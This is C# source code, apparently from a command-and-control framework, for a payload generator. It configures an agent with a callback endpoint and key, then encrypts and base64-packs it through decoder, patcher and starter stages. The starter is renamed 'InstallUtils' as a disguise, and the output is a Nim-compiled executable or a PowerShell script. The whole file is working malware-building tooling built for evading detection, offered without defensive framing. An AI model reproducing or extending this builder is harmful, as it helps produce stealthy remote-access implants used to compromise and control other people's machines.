using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Common.Payload;
using Common.Config;

//public enum MessageLevel
//{
//    Default,
//    Verbose
//}

public partial class PayloadGenerator
{
    public const string AgentSrcFile = "Agent.exe";
    public const string DecoderSrcFile = "DecoderDll.dll";
    public const string StarterSrcFile = "Starter.exe";
    public const string PatcherSrcFile = "PatcherDll.dll";

    public const string NimExecScript = "Payload";

    public event EventHandler<string> MessageSent;

    public PayloadConfig Config = null;


    public PayloadGenerator(PayloadConfig config)
    {
        this.Config = config;
    }

    private string Source(string fileName, PayloadArchitecture arch)
    {
        return Path.Combine(this.Config.SourceFolder, arch.ToString(), fileName);
    }

    private string Working(string fileName)
    {
        return Path.Combine(this.Config.WorkingFolder, fileName);
    }



    public byte[] GeneratePayload(PayloadGenerationOptions options)
    {
        var agentbytes = PrepareAgent(options);
        switch (options.Type)
        {
            case PayloadType.Executable: return this.GenerateExecutable(options, agentbytes);
            case PayloadType.PowerShell: return this.GeneratePowershell(options, agentbytes);
            default:
                throw new NotImplementedException();

        }
    }

    public byte[] GenerateExecutable(PayloadGenerationOptions options, byte[] agent)
    {
        string nimSourceCode = string.Empty;
        string agentb64 = Convert.ToBase64String(agent);
        using (var nimReader = new StreamReader(this.Source("payload.nim", options.Architecture)))
        {
            nimSourceCode = nimReader.ReadToEnd();
        }

        var payload = new StringBuilder();
        foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
        {
            payload.Append("b64 = b64 & \"");
            payload.Append(chunk);
            payload.Append("\"");
            payload.Append(Environment.NewLine);
        }

        var nimFile = "tmp" + ShortGuid.NewGuid() + ".nim";
        nimSourceCode = nimSourceCode.Replace("[[PAYLOAD]]", payload.ToString());

        var nimPath = this.Working(nimFile);
        using (var writer = new StreamWriter(nimPath))
        {
            writer.WriteLine(nimSourceCode);
        }

        var outFile = "tmp" + ShortGuid.NewGuid() + ".exe";
        var outPath = this.Working(outFile);

        var parms = this.ComputeNimBuildParameters(nimPath, outPath, options.Architecture == PayloadArchitecture.x86, options.IsDebug);

        this.MessageSent?.Invoke(this, $"[>] Generating executable...");

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, $"[>] Executing: nim {string.Join(" ", parms)}");
        var executionResult = this.NimBuild(parms);

        if (options.IsVerbose)
            this.MessageSent?.Invoke(this, executionResult.Out);

        if (options.IsVerbose)
            if (executionResult.Result == 0)
                this.MessageSent?.Invoke(this, "Build succeed.");
            else
                this.MessageSent?.Invoke(this, "Build failed.");

        byte[] bytes = null;
        if (executionResult.Result == 0)
        {
            bytes = File.ReadAllBytes(outPath);
            File.Delete(outPath);
        }

        File.Delete(nimPath);

        return bytes;
    }

    public byte[] GeneratePowershell(PayloadGenerationOptions options, byte[] agent)
    {
        string psSourceCode = string.Empty;
        using (var psReader = new StreamReader(this.Source("payload.ps1", options.Architecture)))
        {
            psSourceCode = psReader.ReadToEnd();
        }

        //var payload = new StringBuilder();
        //foreach (var chunk in this.SplitIntoChunks(agentb64, 1000))
        //{
        //    payload.Append("b64 = b64 & \"");
        //    payload.Append(chunk);
        //    payload.Append("\"");
        //    payload.Append(Environment.NewLine);
        //}
        var payload = this.Encode(agent);

        var psFile = "tmp" + ShortGuid.NewGuid() + ".ps1";
        psSourceCode = psSourceCode.Replace("[[PAYLOAD]]", payload.ToString());

        var psPath = this.Working(psFile);
        using (var writer = new StreamWriter(psPath))
        {
            writer.WriteLine(psSourceCode);
        }

        byte[] bytes = File.ReadAllBytes(psPath);
  

        File.Delete(Path.Combine(this.Config.WorkingFolder, psPath));


        return bytes;
    }

    public byte[] PrepareAgent(PayloadGenerationOptions options)
    {
        //Console.WriteLine("Generating encrypted Agent");

        this.MessageSent?.Invoke(this, $"Configuring Agent...");
        byte[] agent = LoadAssembly(this.Source(AgentSrcFile, options.Architecture));

        agent = AssemblyEditor.ReplaceRessources(agent, new Dictionary<string, object>()
        {
            { "EndPoint", options.Endpoint.ToString() },
            { "Key", options.ServerKey ?? String.Empty }
        });


        this.MessageSent?.Invoke(this, $"Encrypting Agent...");
        var encAgent = this.Encrypt(agent);
        var agentb64 = this.Encode(encAgent.Encrypted);


        this.MessageSent?.Invoke(this, $"Creating Decoder...");
        //Create DEcoder for agent
        var decDll = LoadAssembly(this.Source(DecoderSrcFile, options.Architecture));
        decDll = AssemblyEditor.ReplaceRessources(decDll, new Dictionary<string, object>()
        {
            { "Payload", Encoding.UTF8.GetBytes(agentb64) },
            { "Key", encAgent.Secret }
        });


        this.MessageSent?.Invoke(this, $"Creating Patcher...");
        //Create Patcher
        var patchDll = LoadAssembly(this.Source(PatcherSrcFile, options.Architecture));
        patchDll = AssemblyEditor.ReplaceRessources(patchDll, new Dictionary<string, object>()
        {
            { "Payload", decDll }
        });

        var encPatcher = this.Encrypt(patchDll);
        var patcherb64 = this.Encode(encPatcher.Encrypted);

        if (options.Type != PayloadType.Service)
        {
            this.MessageSent?.Invoke(this, $"Creating Starter...");
            //Create Starter
            var starter = LoadAssembly(this.Source(StarterSrcFile, options.Architecture));
            starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
                    {
                        { "Payload", Encoding.UTF8.GetBytes(patcherb64) },
                        { "Key", encPatcher.Secret }
                    });
            var resultAgent = AssemblyEditor.ChangeName(starter, "InstallUtils");
            return resultAgent;
        }

        return null;
    }

    private byte[] LoadAssembly(string filePath)
    {
        return File.ReadAllBytes(filePath);
    }

    private EncryptResult Encrypt(string filePath)
    {
        var fileContent = File.ReadAllBytes(filePath);
        return this.Encrypt(fileContent);
    }

    private EncryptResult Encrypt(byte[] bytes)
    {
        return new Encrypter().Encrypt(bytes);
    }

    private string Encode(byte[] bytes)
    {
        return Convert.ToBase64String(bytes); ;
    }
}
